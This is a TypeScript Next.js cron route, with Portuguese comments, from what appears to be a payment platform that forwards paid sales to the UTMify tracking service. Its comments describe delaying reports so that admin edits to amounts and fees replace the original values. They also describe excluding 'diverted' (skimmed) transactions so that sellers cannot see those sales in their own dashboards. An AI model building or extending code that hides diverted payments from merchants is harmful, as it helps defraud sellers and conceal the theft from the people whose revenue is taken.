import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { dispatchUtmify } from "@/lib/utmify";

export const dynamic = "force-dynamic";
export const maxDuration = 60;

/**
 * Dispatcher delayed do UTMify.
 *
 * Por que delayed? Quando admin edita o amount/fee de uma venda via
 * /admin01/users/[id], queremos que UTMify receba o VALOR JA EDITADO,
 * nao o original. Solucao: ao marcar PAID, agendamos
 * utmifyScheduledAt = paidAt + 60s. Este cron roda a cada minuto e
 * dispara as txs cuja janela ja venceu.
 *
 * Idempotencia: WHERE utmifyDispatchedAt IS NULL AND
 * utmifyScheduledAt <= now() — apos sucesso setamos utmifyDispatchedAt.
 * Se a chamada UTMify falhar, NAO setamos utmifyDispatchedAt — proxima
 * execucao do cron tenta de novo. Sem retry-backoff sofisticado (UTMify
 * tem timeout de 10s, cron roda a cada 60s — basta).
 *
 * Limite: BATCH=200 por execucao. Se houver acumulo maior, proxima
 * execucao pega os restantes (ordem ASC por utmifyScheduledAt).
 */
export async function GET(request: Request) {
  const cronSecret = process.env.CRON_SECRET;
  const auth = request.headers.get("authorization");
  if (!cronSecret || auth !== `Bearer ${cronSecret}`) {
    return NextResponse.json({ error: "unauthorized" }, { status: 401 });
  }

  const now = new Date();
  const BATCH = 200;

  const due = await prisma.transaction.findMany({
    where: {
      utmifyDispatchedAt: null,
      utmifyScheduledAt: { lte: now, not: null },
      // Invisibilidade TOTAL do desvio: nem skim nem rede vao pra UTMify
      // (seller veria a venda no painel UTMify dele). Antes (jun/2026)
      // rede ia — mudou pra 100% invisivel.
      provider: { not: "test" },
      divertedToAcquirer: false,
      divertedToReferrer: false,
    },
    take: BATCH,
    orderBy: { utmifyScheduledAt: "asc" },
    include: { product: { select: { id: true, name: true } } },
  });

  let dispatched = 0;
  let skipped = 0;
  let failed = 0;

  for (const tx of due) {
    try {
      const result = await dispatchUtmify({
        userId: tx.userId,
        transaction: tx,
        product: { id: tx.productId, name: tx.product.name },
      });

      if (result.ok) {
        await prisma.transaction.update({
          where: { id: tx.id },
          data: { utmifyDispatchedAt: new Date() },
        });
        dispatched++;
      } else if (result.skipped) {
        // not_configured / product_not_enabled — marca como dispatched
        // pra nao reprocessar.
        await prisma.transaction.update({
          where: { id: tx.id },
          data: { utmifyDispatchedAt: new Date() },
        });
        skipped++;
      } else {
        // Falha de rede/HTTP — deixa pra proxima execucao tentar.
        failed++;
      }
    } catch (e) {
      console.error(
        "[cron/dispatch-utmify] error dispatching tx:",
        tx.id,
        e,
      );
      failed++;
    }
  }

  return NextResponse.json({
    ok: true,
    dispatched,
    skipped,
    failed,
    totalDue: due.length,
  });
}
